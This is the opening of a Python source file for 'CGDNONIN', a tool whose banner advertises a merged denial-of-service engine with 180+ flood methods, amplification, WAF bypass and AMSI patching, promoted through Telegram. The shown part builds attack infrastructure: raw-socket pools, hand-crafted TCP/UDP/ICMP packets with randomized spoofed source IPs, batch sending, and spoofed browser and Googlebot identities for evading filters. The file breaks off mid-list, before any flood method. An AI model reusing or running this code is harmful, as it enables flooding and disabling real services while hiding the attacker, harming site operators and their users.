#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   ██████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗███╗   ██╗        ║
║  ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██║████╗  ██║        ║
║  ██║     ██║  ███╗██║  ██║██╔██╗ ██║██║   ██║██╔██╗ ██║██║██╔██╗ ██║        ║
║  ██║     ██║   ██║██║  ██║██║╚██╗██║██║   ██║██║╚██╗██║██║██║╚██╗██║        ║
║  ╚██████╗╚██████╔╝██████╔╝██║ ╚████║╚██████╔╝██║ ╚████║██║██║ ╚████║        ║
║   ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝        ║
║                                                                              ║
║              U N I F I E D   ·   S U P R E M E   ·   E N G I N E             ║
║                                                                              ║
║  ddos303 v65.1 + NOVA + CyberGhost merged into one powerplant                ║
║  180+ methods · HTTP/1+2+3 · L4 raw · AMP · Services · Games · CVE           ║
║  Adaptive · WAF bypass · JA3/JA4 · Origin discovery · 12 themes · 6 langs    ║
║  ETW/AMSI patch · Residential proxy · NetHealth · Controller · Web panel    ║
║                                                                              ║
║  Channel : https://t.me/cyber_ghost_error_404_chanel                        ║
║  Contact : https://t.me/Cyber_Ghost_error_404                               ║
║  Parent  : CyberGhost-OS · arsenal / engines / CGDNONIN                     ║
║  License : MIT                                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

For authorized security testing only.
"""
from __future__ import annotations

import argparse
import asyncio
import base64
import ctypes
import hashlib
import importlib.util
import ipaddress
import json
import logging
import os
import platform
import queue as queue_module
import random
import re
import secrets
import shutil
import signal
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import traceback
import unicodedata
import urllib.parse
import urllib3
import uuid
from collections import Counter, OrderedDict, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, unquote, urljoin, urlparse, urlsplit, urlunsplit

# ─── Platform ──────────────────────────────────────────────────────────────
IS_WINDOWS = sys.platform == "win32"
IS_LINUX = sys.platform.startswith("linux")
IS_DARWIN = sys.platform == "darwin"
PLATFORM_NAME = ("Windows" if IS_WINDOWS else "Linux" if IS_LINUX
                 else "macOS" if IS_DARWIN else sys.platform)

try:
    sys.setswitchinterval(0.001)
except Exception:
    pass

try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    os.environ["PYTHONIOENCODING"] = "utf-8"
except Exception:
    pass


def _silent_unraisable(unraisable):
    try:
        exc_msg = str(unraisable.exc_value) if unraisable.exc_value else ""
        if any(p in exc_msg for p in (
            "peer-initiated", "Cannot send data", "unidirectional",
            "SSL connection is closed", "Connection reset",
            "Connection aborted", "Broken pipe", "Too many open files",
            "Operation not permitted", "Network is unreachable",
            "No route to host", "Host is down")):
            return
    except Exception:
        pass
    try:
        sys.__unraisablehook__(unraisable)
    except Exception:
        pass


sys.unraisablehook = _silent_unraisable


# ═══════════════════════════════════════════════════════════════════════════════
#  META / PATHS
# ═══════════════════════════════════════════════════════════════════════════════

APP_NAME    = "CGDNONIN"
APP_FULL    = "CyberGhost Donin — Unified Supreme Engine"
APP_VERSION = "3.0.0-SUPREME"
APP_BUILD   = "2026.05"
APP_AUTHOR  = "Cyber Ghost"
APP_TEAM    = "CyberGhost-OS"
APP_CHANNEL = "https://t.me/cyber_ghost_error_404_chanel"
APP_CONTACT = "https://t.me/Cyber_Ghost_error_404"
APP_PARENT  = "CyberGhost-OS / arsenal / engines / CGDNONIN"
APP_LICENSE = "MIT"
MAX_DURATION = 86400
DEFAULT_DURATION = 180

HOME_DIR = Path.home() / ".cyberghost" / "cgdn"
LOG_DIR  = HOME_DIR / "logs"
CACHE_DIR = HOME_DIR / "cache"
for d in (HOME_DIR, LOG_DIR, CACHE_DIR):
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler(LOG_DIR / "cgdn.log", encoding="utf-8")],
)
log = logging.getLogger("cgdn")
for _n in ("aiohttp", "asyncio", "h2", "aioquic", "websockets",
           "uvicorn", "scapy", "urllib3", "httpx", "curl_cffi"):
    with suppress(Exception):
        logging.getLogger(_n).setLevel(logging.CRITICAL)


# ═══════════════════════════════════════════════════════════════════════════════
#  THEMES — 12
# ═══════════════════════════════════════════════════════════════════════════════

class BaseTheme:
    name = "base"
    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"; ITALIC="\033[3m"; UNDER="\033[4m"
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; BLUE="\033[94m"
    MAGENTA="\033[95m"; CYAN="\033[96m"; WHITE="\033[97m"; GRAY="\033[90m"
    ORANGE="\033[38;5;208m"; PINK="\033[38;5;213m"
    BG_RED="\033[41m"; BG_GREEN="\033[42m"; BG_YELLOW="\033[43m"
    BG_BLUE="\033[44m"; BG_MAGENTA="\033[45m"; BG_CYAN="\033[46m"; BG_BLACK="\033[40m"
    PRIMARY=CYAN; ACCENT=MAGENTA; SUCCESS=GREEN; ERROR=RED; WARN=YELLOW; INFO=BLUE


def _mk(name, **ov):
    d = {k: v for k, v in vars(BaseTheme).items() if k.isupper()}
    d.update(ov)
    return type(name, (), d)


THEMES = {
    "cyberghost": _mk("CG", CYAN="\033[38;5;51m", MAGENTA="\033[38;5;171m",
                       PRIMARY="\033[38;5;51m", ACCENT="\033[38;5;171m"),
    "matrix":     _mk("Matrix", CYAN="\033[38;5;46m", GREEN="\033[38;5;46m",
                       PRIMARY="\033[38;5;46m", ACCENT="\033[38;5;40m"),
    "dracula":    _mk("Dracula", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;212m",
                       PRIMARY="\033[38;5;141m", ACCENT="\033[38;5;212m"),
    "tokyonight": _mk("TokyoNight", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;183m",
                       PRIMARY="\033[38;5;111m", ACCENT="\033[38;5;183m"),
    "gruvbox":    _mk("Gruvbox", CYAN="\033[38;5;109m", MAGENTA="\033[38;5;132m",
                       PRIMARY="\033[38;5;178m", ACCENT="\033[38;5;132m"),
    "synthsplit": _mk("SynthSplit", CYAN="\033[38;5;51m", MAGENTA="\033[38;5;201m",
                       PRIMARY="\033[38;5;201m", ACCENT="\033[38;5;51m"),
    "nord":       _mk("Nord", CYAN="\033[38;5;109m", MAGENTA="\033[38;5;139m",
                       PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;139m"),
    "monokai":    _mk("Monokai", CYAN="\033[38;5;81m", MAGENTA="\033[38;5;197m",
                       PRIMARY="\033[38;5;197m", ACCENT="\033[38;5;81m"),
    "onedark":    _mk("OneDark", CYAN="\033[38;5;80m", MAGENTA="\033[38;5;176m",
                       PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;176m"),
    "catppuccin": _mk("Catppuccin", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;218m",
                       PRIMARY="\033[38;5;218m", ACCENT="\033[38;5;117m"),
    "blood":      _mk("Blood", CYAN="\033[38;5;196m", MAGENTA="\033[38;5;88m",
                       PRIMARY="\033[38;5;196m", ACCENT="\033[38;5;88m"),
    "ice":        _mk("Ice", CYAN="\033[38;5;195m", MAGENTA="\033[38;5;153m",
                       PRIMARY="\033[38;5;195m", ACCENT="\033[38;5;153m"),
}

C = THEMES["cyberghost"]


def apply_theme(name: str):
    global C
    C = THEMES.get(name, THEMES["cyberghost"])


if IS_WINDOWS:
    os.system("")


def term_w() -> int:
    try:
        return min(os.get_terminal_size().columns, 160)
    except Exception:
        return 140


# ═══════════════════════════════════════════════════════════════════════════════
#  I18N — 6 languages
# ═══════════════════════════════════════════════════════════════════════════════

LANGS = {
    "fa": {"title":"نوا","attack":"حمله","target":"هدف","method":"روش",
           "duration":"مدت","concurrency":"همزمانی","proxy":"پروکسی",
           "theme":"تم","lang":"زبان","about":"درباره","exit":"خروج",
           "select":"انتخاب","goodbye":"خدانگهدار baby","sent":"ارسال",
           "failed":"ناموفق","running":"در حال اجرا","stopped":"متوقف",
           "cpu":"CPU","ram":"RAM","health":"سلامت"},
    "en": {"title":"Nova","attack":"Attack","target":"Target","method":"Method",
           "duration":"Duration","concurrency":"Concurrency","proxy":"Proxy",
           "theme":"Theme","lang":"Language","about":"About","exit":"Exit",
           "select":"Select","goodbye":"Goodbye baby","sent":"Sent",
           "failed":"Failed","running":"Running","stopped":"Stopped",
           "cpu":"CPU","ram":"RAM","health":"Health"},
    "ru": {"title":"Nova","attack":"Атака","target":"Цель","method":"Метод",
           "duration":"Длительность","concurrency":"Параллельность","proxy":"Прокси",
           "theme":"Тема","lang":"Язык","about":"О программе","exit":"Выход",
           "select":"Выбор","goodbye":"Пока baby","sent":"Отправлено",
           "failed":"Ошибки","running":"Работает","stopped":"Остановлено",
           "cpu":"CPU","ram":"RAM","health":"Здоровье"},
    "ar": {"title":"Nova","attack":"هجوم","target":"هدف","method":"طريقة",
           "duration":"مدة","concurrency":"تزامن","proxy":"بروكسي",
           "theme":"ثيم","lang":"لغة","about":"حول","exit":"خروج",
           "select":"اختر","goodbye":"وداعا baby","sent":"مرسل",
           "failed":"فشل","running":"قيد التشغيل","stopped":"متوقف",
           "cpu":"CPU","ram":"RAM","health":"صحة"},
    "tr": {"title":"Nova","attack":"Saldırı","target":"Hedef","method":"Yöntem",
           "duration":"Süre","concurrency":"Eşzamanlılık","proxy":"Proxy",
           "theme":"Tema","lang":"Dil","about":"Hakkında","exit":"Çıkış",
           "select":"Seç","goodbye":"Güle güle baby","sent":"Gönderilen",
           "failed":"Başarısız","running":"Çalışıyor","stopped":"Durduruldu",
           "cpu":"CPU","ram":"RAM","health":"Sağlık"},
    "zh": {"title":"Nova","attack":"攻击","target":"目标","method":"方法",
           "duration":"时长","concurrency":"并发","proxy":"代理",
           "theme":"主题","lang":"语言","about":"关于","exit":"退出",
           "select":"选择","goodbye":"再见 baby","sent":"发送",
           "failed":"失败","running":"运行中","stopped":"已停止",
           "cpu":"CPU","ram":"RAM","health":"健康"},
}

_LANG = "fa"


def set_lang(code: str):
    global _LANG
    if code in LANGS:
        _LANG = code


def t(key: str) -> str:
    return LANGS.get(_LANG, LANGS["en"]).get(key, key)


# ═══════════════════════════════════════════════════════════════════════════════
#  VALIDATION (FIX: ? allowed in URL — only control chars + space banned)
# ═══════════════════════════════════════════════════════════════════════════════

MAX_HOST_LEN     = 255
MAX_URL_LEN      = 2048
MAX_METHOD_LEN   = 32
MAX_USERNAME_LEN = 128

_FORBIDDEN_URL = frozenset(
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f "
)
_FORBIDDEN_HOST = frozenset(
    "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f"
    ";|&$`<>(){}[]*?!~#\\\"'\n\r\t "
)

_METHOD_RE = re.compile(r"^[A-Z][A-Z0-9_-]{0,31}$")
_HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
    r"(?:\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*\.?$"
)


class SanitizeError(ValueError):
    pass


def _norm(s: str) -> str:
    if not isinstance(s, str):
        raise SanitizeError(f"expected str, got {type(s).__name__}")
    return unicodedata.normalize("NFKC", s)


def validate_host(host: str) -> str:
    host = _norm(host).strip()
    if not host:
        raise SanitizeError("host: empty")
    if len(host) > MAX_HOST_LEN:
        raise SanitizeError(f"host: length > {MAX_HOST_LEN}")
    for ch in host:
        if ch in _FORBIDDEN_HOST:
            raise SanitizeError(f"host: forbidden char {ch!r}")
    try:
        return str(ipaddress.ip_address(host))
    except ValueError:
        pass
    if not _HOSTNAME_RE.match(host):
        raise SanitizeError(f"host: invalid hostname: {host!r}")
    return host.rstrip(".")


def validate_port(port) -> int:
    if isinstance(port, bool):
        raise SanitizeError("port: bool not allowed")
    try:
        n = int(port)
    except (TypeError, ValueError):
        raise SanitizeError(f"port: not int: {port!r}")
    if not 1 <= n <= 65535:
        raise SanitizeError(f"port: out of range: {n}")
    return n


def validate_url(url: str, allow_schemes=("http", "https")) -> str:
    url = _norm(url).strip()
    if not url:
        raise SanitizeError("url: empty")
    if len(url) > MAX_URL_LEN:
        raise SanitizeError(f"url: length > {MAX_URL_LEN}")
    for ch in url:
        if ch in _FORBIDDEN_URL:
            raise SanitizeError(f"url: control/space char {ch!r}")
    if "://" not in url:
        url = "http://" + url
    parts = urlsplit(url)
    scheme = parts.scheme.lower()
    if scheme not in allow_schemes:
        raise SanitizeError(f"url: scheme {scheme!r} not allowed")
    if not parts.hostname:
        raise SanitizeError("url: missing hostname")
    host = validate_host(parts.hostname)
    port = parts.port
    if port is not None:
        port = validate_port(port)
    netloc = f"[{host}]:{port}" if (port is not None and ":" in host) else \
             f"{host}:{port}" if port is not None else host
    return urlunsplit((scheme, netloc, parts.path or "", parts.query, ""))


def validate_method(method: str, allow_custom: bool = False) -> str:
    method = _norm(method).upper()
    if not method:
        raise SanitizeError("method: empty")
    if len(method) > MAX_METHOD_LEN:
        raise SanitizeError("method: too long")
    if not _METHOD_RE.match(method):
        raise SanitizeError(f"method: invalid: {method!r}")
    if not allow_custom:
        allowed = {"GET", "HEAD", "POST", "PUT", "DELETE",
                   "OPTIONS", "PATCH", "TRACE", "CONNECT"}
        if method not in allowed:
            raise SanitizeError(f"method: not allowed: {method!r}")
    return method


def validate_username(name: str) -> str:
    name = _norm(name).strip()
    if not name:
        raise SanitizeError("username: empty")
    if len(name) > MAX_USERNAME_LEN:
        raise SanitizeError("username: too long")
    if not re.match(r"^[A-Za-z0-9_.\-]+$", name):
        raise SanitizeError("username: invalid chars")
    return name


# ═══════════════════════════════════════════════════════════════════════════════
#  OPTIONAL DEPENDENCY LOADER
# ═══════════════════════════════════════════════════════════════════════════════

def _has_module(name: str) -> bool:
    try:
        return importlib.util.find_spec(name) is not None
    except Exception:
        return False


try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False
    psutil = None

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
    HAS_COLORAMA = True
except ImportError:
    HAS_COLORAMA = False
    class Fore: CYAN=""; YELLOW=""; RED=""; GREEN=""; RESET=""
    class Back: WHITE=""
    class Style: RESET_ALL=""

try:
    import websockets
    HAS_WS = True
except ImportError:
    HAS_WS = False

try:
    import h2.connection, h2.config, h2.events, h2.settings, h2.errors
    HAS_H2 = True
    try:
        H2_VERSION = h2.__version__
        _h2p = H2_VERSION.split(".")
        H2_PATCHED = (int(_h2p[0]), int(_h2p[1])) >= (4, 4)
    except Exception:
        H2_VERSION, H2_PATCHED = "unknown", False
except ImportError:
    HAS_H2 = False
    H2_VERSION, H2_PATCHED = None, False

try:
    from aioquic.asyncio import connect as quic_connect, QuicConnectionProtocol
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.h3.connection import H3Connection
    from aioquic.quic.connection import stream_is_unidirectional
    HAS_AIOQUIC = True
except ImportError:
    HAS_AIOQUIC = False
    QuicConnectionProtocol = object
    H3Connection = None
    quic_connect = None
    QuicConfiguration = None
    stream_is_unidirectional = None

try:
    from scapy.all import (
        IP as S_IP, TCP as S_TCP, UDP as S_UDP, ICMP as S_ICMP,
        Raw as S_Raw, Ether as S_Ether, send as s_send,
        sendp as s_sendp, conf as s_conf,
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    S_IP = S_TCP = S_UDP = S_ICMP = S_Raw = S_Ether = None
    s_send = s_sendp = None

try:
    import dns.resolver
    HAS_DNSPY = True
except ImportError:
    HAS_DNSPY = False

try:
    from curl_cffi import requests as curl_requests
    from curl_cffi import CurlOpt
    HAS_CURL_CFFI = True
    try:
        import curl_cffi as _cc
        CURL_CFFI_VERSION = getattr(_cc, "__version__", "unknown")
    except Exception:
        CURL_CFFI_VERSION = "unknown"
except ImportError:
    HAS_CURL_CFFI = False
    curl_requests = None
    CurlOpt = None
    CURL_CFFI_VERSION = None

try:
    import brotli
    HAS_BROTLI = True
except ImportError:
    HAS_BROTLI = False

try:
    import socks as pysocks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False
    pysocks = None

try:
    from aiohttp_socks import ProxyConnector
    HAS_AIO_SOCKS = True
except ImportError:
    HAS_AIO_SOCKS = False
    ProxyConnector = None

HAS_PLAYWRIGHT = _has_module("playwright")
HAS_BROWSERFORGE = _has_module("browserforge")
HAS_CLOUDSCRAPER = _has_module("cloudscraper")
HAS_PYSNMP = _has_module("pysnmp")

if HAS_BROWSERFORGE:
    try:
        from browserforge.headers import HeaderGenerator as BFHeaderGen
        from browserforge.fingerprints import FingerprintGenerator as BFFPG
    except Exception:
        BFHeaderGen = BFFPG = None

try:
    import mmh3
    HAS_MMH3 = True
except ImportError:
    HAS_MMH3 = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN / PRIVILEGES
# ═══════════════════════════════════════════════════════════════════════════════

def is_admin() -> bool:
    try:
        if IS_WINDOWS:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


def can_raw_socket() -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.close()
        return True
    except (PermissionError, OSError):
        return False


def raise_fd_limit() -> int:
    if IS_WINDOWS:
        return -1
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        try:
            resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
        except Exception:
            pass
        return int(hard) if hard != resource.RLIM_INFINITY else -1
    except Exception:
        return -1


HAS_ADMIN = is_admin()
HAS_RAW = can_raw_socket()


# ═══════════════════════════════════════════════════════════════════════════════
#  EVENT LOOP POLICY
# ═══════════════════════════════════════════════════════════════════════════════

_LOOP_BACKEND = "Default (asyncio)"
if IS_WINDOWS:
    if HAS_PLAYWRIGHT:
        _LOOP_BACKEND = "Proactor (Windows) — Playwright compatible"
    else:
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            _LOOP_BACKEND = "Selector (Windows)"
        except Exception:
            _LOOP_BACKEND = "Proactor (Windows) — fallback"
else:
    if _has_module("uvloop"):
        try:
            import uvloop
            uvloop.install()
            _LOOP_BACKEND = "UVLoop (POSIX)"
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
#  SAFE INPUT (single lock across all threads)
# ═══════════════════════════════════════════════════════════════════════════════

INPUT_LOCK = threading.Lock()


def safe_input(prompt: str = "") -> str:
    with INPUT_LOCK:
        try:
            return input(prompt)
        except (EOFError, KeyboardInterrupt):
            return ""


# ═══════════════════════════════════════════════════════════════════════════════
#  RANDOM HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

class XorShift128:
    __slots__ = ("x", "y", "z", "w")
    def __init__(self, seed=None):
        s = seed or secrets.randbits(64)
        self.x = (s | 1) & 0xFFFFFFFFFFFFFFFF
        self.y = 362436069
        self.z = 521288629
        self.w = 88675123

    def next(self) -> int:
        t = (self.x ^ (self.x << 11)) & 0xFFFFFFFFFFFFFFFF
        self.x = self.y; self.y = self.z; self.z = self.w
        self.w = (self.w ^ (self.w >> 19)) ^ (t ^ (t >> 8))
        return self.w & 0xFFFFFFFFFFFFFFFF

    def port(self) -> int:
        return 1024 + (self.next() % 64512)


_tls = threading.local()


def _rng() -> XorShift128:
    r = getattr(_tls, "rng", None)
    if r is None:
        r = XorShift128(secrets.randbits(64) ^ id(threading.current_thread()))
        _tls.rng = r
    return r


def rand_ip() -> str:
    for _ in range(32):
        n = secrets.randbits(32)
        first = n >> 24
        if first in (0, 10, 127) or first >= 224:
            continue
        if first == 172 and 16 <= ((n >> 16) & 0xFF) <= 31:
            continue
        if first == 192 and ((n >> 16) & 0xFF) == 168:
            continue
        if first == 169 and ((n >> 16) & 0xFF) == 254:
            continue
        return socket.inet_ntoa(struct.pack("!I", n))
    return "1.2.3.4"


def rand_port() -> int:
    return 1024 + secrets.randbelow(64512)


# ═══════════════════════════════════════════════════════════════════════════════
#  PACKET BUILDERS
# ═══════════════════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def ip_header(src: str, dst: str, proto: int, plen: int, ttl: int = 64,
              frag: int = 0) -> bytes:
    tl = 20 + plen
    id_ = secrets.randbits(16)
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, tl, id_, frag, ttl, proto, 0,
                    socket.inet_aton(src), socket.inet_aton(dst))
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, tl, id_, frag, ttl, proto,
                       _checksum(h), socket.inet_aton(src),
                       socket.inet_aton(dst))


def tcp_packet(src: str, dst: str, sp: int, dp: int, seq: int, ack: int,
               flags: int, payload: bytes = b"", ttl: int = 64) -> bytes:
    opts = b"\x02\x04\x05\xb4" + b"\x01" * 4
    doff = (20 + len(opts)) // 4
    h = struct.pack("!HHLLBBHHH", sp, dp, seq, ack, doff << 4, flags,
                    65535, 0, 0) + opts
    pseudo = (socket.inet_aton(src) + socket.inet_aton(dst) +
              struct.pack("!BBH", 0, socket.IPPROTO_TCP,
                          len(h) + len(payload)))
    ck = _checksum(pseudo + h + payload)
    h = (struct.pack("!HHLLBBH", sp, dp, seq, ack, doff << 4, flags, 65535) +
         struct.pack("!H", ck) + struct.pack("!H", 0) + opts)
    return (ip_header(src, dst, socket.IPPROTO_TCP, len(h) + len(payload), ttl) +
            h + payload)


def udp_packet(src: str, dst: str, sp: int, dp: int, payload: bytes,
               ttl: int = 64) -> bytes:
    ulen = 8 + len(payload)
    h = struct.pack("!HHHH", sp, dp, ulen, 0)
    pseudo = (socket.inet_aton(src) + socket.inet_aton(dst) +
              struct.pack("!BBH", 0, socket.IPPROTO_UDP, ulen))
    ck = _checksum(pseudo + h + payload) or 0xFFFF
    return (ip_header(src, dst, socket.IPPROTO_UDP, ulen, ttl) +
            struct.pack("!HHHH", sp, dp, ulen, ck) + payload)


def icmp_packet(src: str, dst: str, payload: bytes, typ: int = 8,
                code: int = 0) -> bytes:
    iid = secrets.randbits(16); iseq = secrets.randbits(16)
    h = struct.pack("!BBHHH", typ, code, 0, iid, iseq)
    ck = _checksum(h + payload)
    return (ip_header(src, dst, socket.IPPROTO_ICMP, len(h) + len(payload)) +
            struct.pack("!BBHHH", typ, code, ck, iid, iseq) + payload)


# ═══════════════════════════════════════════════════════════════════════════════
#  RAW SOCKET POOL (per-thread + zerocopy + sndbuf)
# ═══════════════════════════════════════════════════════════════════════════════

class RawSocketPool:
    def __init__(self, proto: int, hdrincl: bool = True,
                 sndbuf: int = 64 * 1024 * 1024):
        self.proto = proto; self.hdrincl = hdrincl; self.sndbuf = sndbuf
        self._local = threading.local()

    def _make(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, self.proto)
            if self.hdrincl:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            with suppress(Exception):
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.sndbuf)
            if hasattr(socket, "SO_ZEROCOPY"):
                with suppress(Exception):
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_ZEROCOPY, 1)
            s.setblocking(False)
            return s
        except (PermissionError, OSError):
            return None

    def get(self):
        s = getattr(self._local, "sock", None)
        if s is None:
            s = self._make()
            self._local.sock = s
        return s

    def sendto(self, data: bytes, addr: Tuple[str, int]) -> bool:
        s = self.get()
        if s is None:
            return False
        try:
            s.sendto(data, addr)
            return True
        except (BlockingIOError, OSError):
            return False


raw_tcp  = RawSocketPool(socket.IPPROTO_TCP, hdrincl=True)
raw_udp  = RawSocketPool(socket.IPPROTO_UDP, hdrincl=True)
raw_icmp = RawSocketPool(socket.IPPROTO_ICMP, hdrincl=False)
raw_ip   = RawSocketPool(socket.IPPROTO_RAW, hdrincl=True)


# ═══════════════════════════════════════════════════════════════════════════════
#  SENDMMSG — Linux batch syscall (via ctypes)
# ═══════════════════════════════════════════════════════════════════════════════

_libc = None
if not IS_WINDOWS:
    for _n in ("libc.so.6", "libc.so", "libSystem.B.dylib"):
        with suppress(Exception):
            _libc = ctypes.CDLL(_n, use_errno=True)
            break

_sendmmsg_fn = None
if IS_LINUX and _libc is not None:
    with suppress(Exception):
        _sendmmsg_fn = _libc.sendmmsg
        _sendmmsg_fn.argtypes = [ctypes.c_int, ctypes.c_void_p,
                                  ctypes.c_uint, ctypes.c_int]
        _sendmmsg_fn.restype = ctypes.c_int


# ═══════════════════════════════════════════════════════════════════════════════
#  IDENTITY DATA
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    "https://www.youtube.com/", "https://t.me/", "https://www.instagram.com/",
    "https://github.com/", "https://stackoverflow.com/", "https://news.ycombinator.com/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "fa-IR,fa;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
]

COOKIE_NAMES = [
    "PHPSESSID", "session_id", "JSESSIONID", "csrftoken", "_ga", "cf_clearance",
    "ASP.NET_SessionId", "laravel_session", "XSRF-TOKEN", "wordpress_logged_in",
    "wp-settings-1", "session", "sid", "auth", "token", "jwt", "access_token",
    "_gid", "_gat", "__cfduid", "_fbp", "_hjid",
]

CURL_IMPERSONATE = [
    "chrome136", "chrome133a", "chrome124", "chrome123", "chrome120",
    "safari260", "safari184", "safari180", "firefox147", "firefox144",
    "edge101", "edge99",
]

GOOGLEBOT_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

REFERER_PREFIXES = [
    "https://www.facebook.com/l.php?u=", "https://www.google.com/translate?u=",
    "https://www.bing.com/search?q=", "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=", "https://www.reddit.com/submit?url=",
    "https://twitter.com/intent/tweet?url=", "https://t.me/share/url?url=",
    "https://wa.me/?text=", "https://www.linkedin.com/sharing/share-offsite/?url=",
    "https://www.pinterest.com/pin/create/button/?url=",
